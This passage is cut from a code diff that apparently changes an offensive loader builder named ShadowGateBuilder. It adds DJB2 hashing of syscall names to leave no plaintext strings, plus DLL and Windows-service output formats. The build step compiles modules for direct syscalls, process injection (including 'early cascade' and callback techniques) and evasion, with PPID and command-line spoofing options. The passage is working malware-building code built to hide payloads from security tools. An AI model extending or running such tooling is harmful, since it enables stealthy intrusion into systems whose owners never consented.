+#endif
         
         // Find function in export table
         PVOID pFunc = GetProcAddressByHash(pNtdll, dwHash);
@@ -5063,6 +5832,10 @@ typedef struct _FILE_STANDARD_INFORMATION {
 #define DEBUG_BUILD 0
 #endif
 
+#ifndef ENABLE_SYSCALL_HASH
+#define ENABLE_SYSCALL_HASH 0
+#endif
+
 #if DEBUG_BUILD
     #define LOG_INFO(fmt, ...)    printf("[*] " fmt "\\n", ##__VA_ARGS__)
     #define LOG_SUCCESS(fmt, ...) printf("[+] " fmt "\\n", ##__VA_ARGS__)
@@ -5218,11 +5991,25 @@ class ShadowGateBuilder:
         # Compile
         print(colored("\n[*] Starting compilation...", Colors.CYAN))
         
-        output_exe = self.output_dir / self.config.output_file
+        # Determine output file path (handle .dll extension for DLL format)
+        output_file_path = self.config.output_file
+        if self.config.output_format == 'dll':
+            p = Path(output_file_path)
+            if p.suffix.lower() != '.dll':
+                output_file_path = p.stem + '.dll'
+        output_exe = self.output_dir / output_file_path
+        
+        # Determine entry point file based on output format
+        if self.config.output_format == 'dll':
+            entry_file = 'dllmain.cpp'
+        elif self.config.output_format == 'svc':
+            entry_file = 'svcmain.cpp'
+        else:
+            entry_file = 'main.cpp'
         
         # Determine which files to compile
         cpp_files = [
-            'main.cpp', 'syscalls.cpp', 'resolver.cpp',
+            entry_file, 'syscalls.cpp', 'resolver.cpp',
             'injection.cpp', 'evasion.cpp',
             'earlycascade.cpp',   # always needed — injection dispatcher calls InjectEarlyCascade()
             'callback.cpp',        # always needed — injection dispatcher calls InjectCallback()
@@ -5270,6 +6057,8 @@ class ShadowGateBuilder:
         else:
             defines.append('RESOLVER_METHOD=3')
         
+        defines.append(f'ENABLE_SYSCALL_HASH={1 if self.config.syscall_hash else 0}')
+        
         success = self.compiler.compile(
             source_dir=str(self.output_dir),
             output_file=str(output_exe),
@@ -5277,7 +6066,8 @@ class ShadowGateBuilder:
             asm_files=asm_files,
             libs=libs,
             defines=defines,
-            debug=self.config.debug
+            debug=self.config.debug,
+            output_format=self.config.output_format,
         )
         
         if success:
@@ -5361,6 +6151,9 @@ Injection Methods:
                                choices=[RESOLVER_PEB, RESOLVER_FRESH, RESOLVER_HYBRID],
                                default=RESOLVER_HYBRID,
                                help='NTDLL resolver method (default: hybrid)')
+    
+    syscall_group.add_argument('--syscall-hash', action='store_true', default=False,
+                               help='Replace plaintext syscall name strings with DJB2 hashes in SSN resolver (zero string footprint)')
     
     # Obfuscation options
     obfuscation_group = parser.add_argument_group('Obfuscation Options')
@@ -5459,6 +6252,12 @@ Injection Methods:
     build_group.add_argument('--debug', action='store_true',
                              help='Build with debug output enabled')
     
+    build_group.add_argument('--output-format',
+                             choices=['pe', 'dll', 'svc'],
+                             default='pe',
+                             dest='output_format',
+                             help='Output format: pe (EXE), dll (DLL with DllMain), svc (Windows Service EXE) (default: pe)')
+    
     # Profile options
     profile_group = parser.add_argument_group('Profile Options')
     profile_group.add_argument('--profile',
@@ -5510,6 +6309,8 @@ def args_to_config(args: argparse.Namespace) -> BuildConfig:
     config.spoof_cmdline = args.spoof_cmdline
     config.ppid_spoof = args.ppid_spoof
     config.block_dlls = args.block_dlls
+    config.syscall_hash = args.syscall_hash
+    config.output_format = args.output_format
     
     return config
 
@@ -5572,6 +6373,8 @@ def main():
         if args.spoof_cmdline:                    config.spoof_cmdline    = True
         if args.ppid_spoof:                       config.ppid_spoof       = args.ppid_spoof
         if args.block_dlls:                       config.block_dlls       = True
+        if args.syscall_hash:                     config.syscall_hash     = True
+        if args.output_format != 'pe':            config.output_format    = args.output_format
     else:
         config = args_to_config(args)
 
